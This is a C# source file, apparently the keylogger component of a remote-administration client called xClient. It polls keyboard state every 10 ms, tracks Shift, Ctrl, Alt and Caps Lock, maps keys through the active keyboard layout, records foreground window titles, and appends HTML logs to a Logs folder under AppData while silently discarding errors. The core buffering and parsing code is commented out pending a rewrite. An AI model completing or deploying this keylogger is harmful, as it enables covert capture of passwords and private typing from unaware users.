using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.Keylogger;

namespace xClient.Core.Keylogger
{
    public struct LoggedKey
    {
        public KeyloggerKeys PressedChar { get; set; }
    }

    public class Logger
    {
        public static Logger Instance;

        public bool Enabled
        {
            get { return _timerLogKeys.Enabled && _timerFlush.Enabled && _timerEmptyKeyBuffer.Enabled; }
            set
            {
                _timerLogKeys.Enabled = _timerFlush.Enabled = _timerEmptyKeyBuffer.Enabled = value;
            }
        }

        private static bool ShiftKey
        {
            get
            {
                return Convert.ToBoolean(Win32.GetAsyncKeyState(Keys.ShiftKey) & 0x8000); //Returns true if shiftkey is pressed
            }
        }

        private static bool ControlKey
        {
            get
            {
                return Convert.ToBoolean(Win32.GetAsyncKeyState(Keys.ControlKey) & 0x8000); //Returns true if controlkey is pressed
            }
        }

        private static bool AltKey
        {
            get
            {
                return Convert.ToBoolean(Win32.GetAsyncKeyState(Keys.Menu) & 0x8000); //Returns true if altkey is pressed
            }
        }

        private static bool CapsLock
        {
            get
            {
                return Control.IsKeyLocked(Keys.CapsLock); //Returns true if Capslock is toggled on
            }
        }
        
        private static bool EscapeKey
        {
            get
            {
                return Convert.ToBoolean(Win32.GetAsyncKeyState(Keys.Escape) & 0x8000); //Returns true if Escape is pressed
            }
        }

        private StringBuilder _logFileBuffer;
        private string _hWndTitle;
        private string _hWndLastTitle;

        private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                            "\\Logs\\";

        private readonly List<short> _enumValues;
        private volatile List<LoggedKey> _keyBuffer;
        private readonly System.Timers.Timer _timerLogKeys;
        private readonly System.Timers.Timer _timerEmptyKeyBuffer;
        private readonly System.Timers.Timer _timerFlush;

        /// <summary>
        /// Creates the logging class that provides keylogging functionality.
        /// </summary>
        /// <param name="flushInterval">The interval, in milliseconds, to flush the contents of the keylogger to the file.</param>
        public Logger(double flushInterval)
        {
            Instance = this;
            _hWndLastTitle = string.Empty;

            WriteFile();

            _keyBuffer = new List<LoggedKey>();

            _enumValues = new List<short>()
                //Populate enumValues list with the Virtual Key Codes of the keys we want to log
            {
                8, //Backspace
                9, //Tab
                13, //Enter
                32, //Space
                46, //Delete
            };

            for (short i = 48; i <= 57; i++) //0-9 regular
            {
                _enumValues.Add(i);
            }

            for (short i = 65; i <= 122; i++)
                //65-90 A-Z
                //91-92 LWin + RWin key
                //skip 93-94 Applications and sleep key
                //95-111 numpad keys, 112-122 F1-F11 keys
            {
                if (i >= 93 && i <= 94) continue;
                _enumValues.Add(i);
            }

            for (short i = 186; i <= 192; i++)
                //186 VK_OEM_1, 187 VK_OEM_PLUS, 188 VK_OEM_COMMA, 189 VK_OEM_MINUS, 190 VK_OEM_PERIOD, 191 VK_OEM_2, 192 VK_OEM_3
            {
                _enumValues.Add(i);
            }

            for (short i = 219; i <= 222; i++) //219 VK_OEM_4, 220 VK_OEM_5, 221 VK_OEM_6, 222 VK_OEM_7
            {
                _enumValues.Add(i);
            }

            this._timerLogKeys = new System.Timers.Timer {Enabled = false, Interval = 10};
            this._timerLogKeys.Elapsed += this.timerLogKeys_Elapsed;

            this._timerEmptyKeyBuffer = new System.Timers.Timer { Enabled = false, Interval = 500 };
            this._timerEmptyKeyBuffer.Elapsed += this.timerEmptyKeyBuffer_Elapsed;

            this._timerFlush = new System.Timers.Timer {Enabled = false, Interval = flushInterval};
            this._timerFlush.Elapsed += this.timerFlush_Elapsed;

            this._logFileBuffer = new StringBuilder();
        }

        private string HighlightSpecialKey(string name)
        {
            return string.Format("<font color=\"0000FF\">[{0}]</font>", name);
        }

        private void timerEmptyKeyBuffer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            int j = 0;
            LoggedKey[] keybuffer = new LoggedKey[_keyBuffer.Count];
            _keyBuffer.CopyTo(keybuffer);
            foreach (var k in keybuffer)
            {
                if (k.PressedChar != null)
                {
                    // TODO: RE-WRITE THE WAY IT IS PARSED.

                    //switch (k.PressedChar)
                    //{
                    //    case 8:
                    //        _logFileBuffer.Append(HighlightSpecialKey("Back"));
                    //        break;
                    //    case 9:
                    //        _logFileBuffer.Append(HighlightSpecialKey("Tab"));
                    //        break;
                    //    case 13:
                    //        _logFileBuffer.Append(HighlightSpecialKey("Enter"));
                    //        break;
                    //    case 32:
                    //        _logFileBuffer.Append(" ");
                    //        break;
                    //    case 46:
                    //        _logFileBuffer.Append(HighlightSpecialKey("Del"));
                    //        break;
                    //    case 91:
                    //    case 92:
                    //        _logFileBuffer.Append(HighlightSpecialKey("Win"));
                    //        break;
                    //    case 112:
                    //    case 113:
                    //    case 114:
                    //    case 115:
                    //    case 116:
                    //    case 117:
                    //    case 118:
                    //    case 119:
                    //    case 120:
                    //    case 121:
                    //    case 122:
                    //        _logFileBuffer.Append(HighlightSpecialKey("F" + (k.Value - 111)));
                    //        break;
                    //    default:
                    //        if (_enumValues.Contains(k.Value))
                    //        {
                    //            if (k.ShiftKey || k.ControlKey || k.AltKey || k.EscapeKey)
                    //            {
                    //                _logFileBuffer.Append(
                    //                    HighlightSpecialKey(
                    //                        ((k.ShiftKey)   ? "SHIFT-" : string.Empty) +
                    //                        ((k.ControlKey) ? "CTRL-"  : string.Empty) +
                    //                        ((k.AltKey)     ? "ALT-"   : string.Empty) +
                    //                        ((k.EscapeKey)  ? "ESC-"   : string.Empty) +
                    //                        FromKeys(k.Value, k.ShiftKey, k.CapsLock)
                    //                        ));
                    //            }
                    //            else
                    //            {
                    //                _logFileBuffer.Append(FromKeys(k.Value, k.ShiftKey, k.CapsLock));
                    //            }
                    //        }
                    //        break;
                    //}
                }
                j++;
            }
            if (j > 0 && j <= _keyBuffer.Count)
                _keyBuffer.RemoveRange(0, j);
        }

        private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            foreach (short i in _enumValues) //Loop through our enumValues list populated with the keys we want to log
            {
                if (Win32.GetAsyncKeyState(i) == -32767) //GetAsycKeyState returns -32767 to indicate keypress
                {
                    // TODO: RE-WRITE THE WAY THE KEYBUFFER ADDS A NEW LOGGED KEY.

                    //_keyBuffer.Add(new LoggedKey() { PressedChar = i });
                    //_hWndTitle = GetActiveWindowTitle(); //Get active thread window title
                    //if (_hWndTitle != null)
                    //{
                    //    if (_hWndTitle != _hWndLastTitle && _enumValues.Contains(i))
                    //        //Only write title to log if a key is pressed that we support
                    //    {
                    //        _hWndLastTitle = _hWndTitle;
                    //        _logFileBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
                    //    }
                    //}
                }
            }
        }

        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string fileName = _filePath + DateTime.Now.ToString("MM-dd-yyyy");

            try
            {
                if (!Directory.Exists(_filePath))
                    Directory.CreateDirectory(_filePath);

                if (!File.Exists(fileName))
                    writeHeader = true;

                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fileStream))
                    {
                        try
                        {
                            if (writeHeader)
                            {
                                sw.Write(
                                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                    DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");

                                if (_logFileBuffer.Length > 0)
                                    sw.Write(_logFileBuffer);

                                _hWndLastTitle = string.Empty;
                            }
                            else
                                sw.Write(_logFileBuffer);
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }

            _logFileBuffer = new StringBuilder();
        }

        private string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            Win32.GetWindowText(Win32.GetForegroundWindow().ToInt32(), sbTitle, sbTitle.Capacity);

            string title = sbTitle.ToString();

            return title != string.Empty ? title : null;
        }

        private IntPtr GetActiveKeyboardLayout()
        {
            uint pid;
            return Win32.GetKeyboardLayout(Win32.GetWindowThreadProcessId(Win32.GetForegroundWindow(), out pid));
        }

        private char? FromKeys(int keys, bool shift, bool caps)
        {
            var keyStates = new byte[256];
                //keyStates is a byte array that specifies the current state of the keyboard and keys
            //The keys we are interested in are modifier keys such as shift and caps lock
            if (shift)
                keyStates[16] = 0x80;
                    //keyStates[16] tells our ToUnicodeEx method the state of the shift key which is 0x80 (Key pressed down)
            if (caps)
                keyStates[20] = 0x01;
                    //keyStates[20] tells our ToUnicodeEx method the state of the Capslock key which is 0x01 (Key toggled on)

            var sb = new StringBuilder(10);

            return Win32.ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, GetActiveKeyboardLayout()) == 1
                ? (char?) sb[0]
                : null;
                //Get the appropriate unicode character from the state of keyboard and from the Keyboard layout (language) of the active thread
        }
    }
}
